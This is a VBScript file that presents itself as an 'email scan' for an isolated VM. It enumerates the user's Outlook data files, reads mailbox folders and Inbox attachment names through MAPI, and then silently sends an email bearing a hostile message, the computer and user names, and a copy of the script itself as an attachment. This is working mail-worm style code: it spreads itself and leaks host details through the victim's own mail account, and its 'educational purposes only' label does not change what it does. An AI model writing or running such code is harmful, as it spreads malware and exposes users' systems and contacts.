Option Explicit

Dim objOutlook, objNamespace, objFolder, objMailItem
Dim objFSO, objShell, objLogFile
Dim strAppData, strSearchPath, strReport
Dim intEmailCount, intFolderCount, intAttachmentCount
Dim arrFolders, arrFiles, arrAttachments
Dim i, j, k
Dim strFoundEmail

Dim EMAIL_BODY
EMAIL_BODY = "I hate you." & vbCrLf & _
             "Dont talk to me ever again." & vbCrLf & _
             "Why me?." & vbCrLf & vbCrLf & _
             "System: " & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
             "User: " & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
             "Timestamp: " & Now() & vbCrLf & vbCrLf & _
             "Thank you for testing this script." & vbCrLf & _
             "NOTE: This is for educational purposes only."

Dim ATTACHMENT_PATH
ATTACHMENT_PATH = WScript.ScriptFullName
WScript.Echo ATTACHMENT_PATH   

Dim REPORT_PATH
REPORT_PATH = "C:\temp\email_scan_results.txt"

intEmailCount = 0
intFolderCount = 0
intAttachmentCount = 0
strReport = ""
strFoundEmail = ""

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

If Not objFSO.FolderExists("C:\temp") Then
    objFSO.CreateFolder("C:\temp")
End If

strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "EMAIL SCAN - ISOLATED VM" & vbCrLf
strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "Timestamp: " & Now() & vbCrLf
strReport = strReport & "============================================" & vbCrLf & vbCrLf

strReport = strReport & "PHASE 1: File System Scan" & vbCrLf
strReport = strReport & "------------------------" & vbCrLf

strSearchPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Outlook"
strReport = strReport & "Scanning: " & strSearchPath & vbCrLf

If objFSO.FolderExists(strSearchPath) Then
    Set objFolder = objFSO.GetFolder(strSearchPath)
    
    For Each objFile In objFolder.Files
        Dim strExt
        strExt = LCase(objFSO.GetExtensionName(objFile.Name))
        
        If strExt = "pst" Or strExt = "ost" Or strExt = "pab" Or strExt = "oab" Then
            intEmailCount = intEmailCount + 1
            strReport = strReport & "  [FOUND] " & objFile.Name & vbCrLf
            strReport = strReport & "    Size: " & FormatNumber(objFile.Size / 1024, 0) & " KB" & vbCrLf
            strReport = strReport & "    Modified: " & objFile.DateLastModified & vbCrLf
            
            ' Extract email from filename (remove extension)
            strFoundEmail = Replace(objFile.Name, "." & objFSO.GetExtensionName(objFile.Name), "")
            ' Remove common Outlook file suffixes
            strFoundEmail = Replace(strFoundEmail, ".pst", "")
            strFoundEmail = Replace(strFoundEmail, ".ost", "")
            strFoundEmail = Replace(strFoundEmail, ".pab", "")
            strFoundEmail = Replace(strFoundEmail, ".oab", "")
            
            strReport = strReport & "    Email: " & strFoundEmail & vbCrLf
        End If
    Next
Else
    strReport = strReport & "  Folder not found" & vbCrLf
End If

strReport = strReport & "Total email files found: " & intEmailCount & vbCrLf & vbCrLf

' If no email files found, use default
If strFoundEmail = "" Then
    strFoundEmail = "default@domain.com"
    strReport = strReport & "No email files found - using default: " & strFoundEmail & vbCrLf & vbCrLf
End If

strReport = strReport & "PHASE 2: Outlook Folder Analysis" & vbCrLf
strReport = strReport & "-----------------------------" & vbCrLf

On Error Resume Next
Set objOutlook = GetObject(, "Outlook.Application")

If objOutlook Is Nothing Then
    Set objOutlook = CreateObject("Outlook.Application")
    If Err.Number <> 0 Then
        strReport = strReport & "Cannot access Outlook" & vbCrLf
        GoTo SaveAndExit
    End If
End If
On Error GoTo 0

Set objNamespace = objOutlook.GetNamespace("MAPI")
objNamespace.Logon

strReport = strReport & "Connected to Outlook" & vbCrLf

arrFolders = Array( _
    3, "Deleted Items", _
    4, "Outbox", _
    5, "Sent Items", _
    6, "Inbox", _
    9, "Calendar", _
    10, "Contacts", _
    11, "Journal", _
    12, "Notes", _
    13, "Tasks", _
    16, "Drafts" _
)

For i = 0 To UBound(arrFolders) Step 2
    Dim folderID, folderName, objFolderItem
    folderID = arrFolders(i)
    folderName = arrFolders(i + 1)
    
    On Error Resume Next
    Set objFolderItem = objNamespace.GetDefaultFolder(folderID)
    On Error GoTo 0
    
    If Not objFolderItem Is Nothing Then
        intFolderCount = intFolderCount + 1
        strReport = strReport & "  [FOLDER] " & folderName & vbCrLf
        strReport = strReport & "    Items: " & objFolderItem.Items.Count & vbCrLf
        strReport = strReport & "    Unread: " & objFolderItem.UnReadItemCount & vbCrLf
        
        If folderID = 6 Then
            Dim objItems, objMail, objAttach
            Set objItems = objFolderItem.Items
            intAttachmentCount = 0
            
            Dim maxItems, itemCount
            maxItems = 10
            itemCount = 0
            
            For Each objMail In objItems
                itemCount = itemCount + 1
                If itemCount > maxItems Then Exit For
                
                If objMail.Class = 43 Then
                    If objMail.Attachments.Count > 0 Then
                        intAttachmentCount = intAttachmentCount + objMail.Attachments.Count
                        strReport = strReport & "    [ATTACHMENT] " & objMail.Subject & vbCrLf
                        For Each objAttach In objMail.Attachments
                            strReport = strReport & "      - " & objAttach.FileName & " (" & _
                                FormatNumber(objAttach.Size / 1024, 0) & " KB)" & vbCrLf
                        Next
                    End If
                End If
            Next
        End If
        strReport = strReport & vbCrLf
    End If
Next

strReport = strReport & "PHASE 3: Sending Test Email" & vbCrLf
strReport = strReport & "--------------------------" & vbCrLf

On Error Resume Next
Set objMailItem = objOutlook.CreateItem(0)

If Not objMailItem Is Nothing Then
    ' Use the found email as both recipient and subject
    objMailItem.To = strFoundEmail
    objMailItem.Subject = "Email from: " & strFoundEmail
    objMailItem.Body = EMAIL_BODY
    
    ' Check if attachment exists before adding
    If objFSO.FileExists(ATTACHMENT_PATH) Then
        objMailItem.Attachments.Add ATTACHMENT_PATH
        strReport = strReport & "Attachment added: " & ATTACHMENT_PATH & vbCrLf
    Else
        strReport = strReport & "Attachment not found: " & ATTACHMENT_PATH & vbCrLf
    End If
    
    objMailItem.Send
    
    strReport = strReport & "Email sent to: " & strFoundEmail & vbCrLf
    strReport = strReport & "Subject: Email from: " & strFoundEmail & vbCrLf
Else
    strReport = strReport & "Could not create email" & vbCrLf
End If
On Error GoTo 0

strReport = strReport & vbCrLf

SaveAndExit:
strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "SCAN COMPLETE" & vbCrLf
strReport = strReport & "============================================" & vbCrLf
strReport = strReport & "Summary:" & vbCrLf
strReport = strReport & "  - Email files found: " & intEmailCount & vbCrLf
strReport = strReport & "  - Outlook folders scanned: " & intFolderCount & vbCrLf
strReport = strReport & "  - Attachments found: " & intAttachmentCount & vbCrLf
strReport = strReport & "  - Email used: " & strFoundEmail & vbCrLf
strReport = strReport & "============================================" & vbCrLf

Set objLogFile = objFSO.CreateTextFile(REPORT_PATH, True)
objLogFile.WriteLine strReport
objLogFile.Close

MsgBox "Complete" & vbCrLf & "Report: " & REPORT_PATH & vbCrLf & "Email sent to: " & strFoundEmail, vbInformation, "Done"

Set objMailItem = Nothing
Set objFolderItem = Nothing
Set objFolder = Nothing
Set objNamespace = Nothing
Set objOutlook = Nothing
Set objFSO = Nothing
Set objShell = Nothing
Set objLogFile = Nothing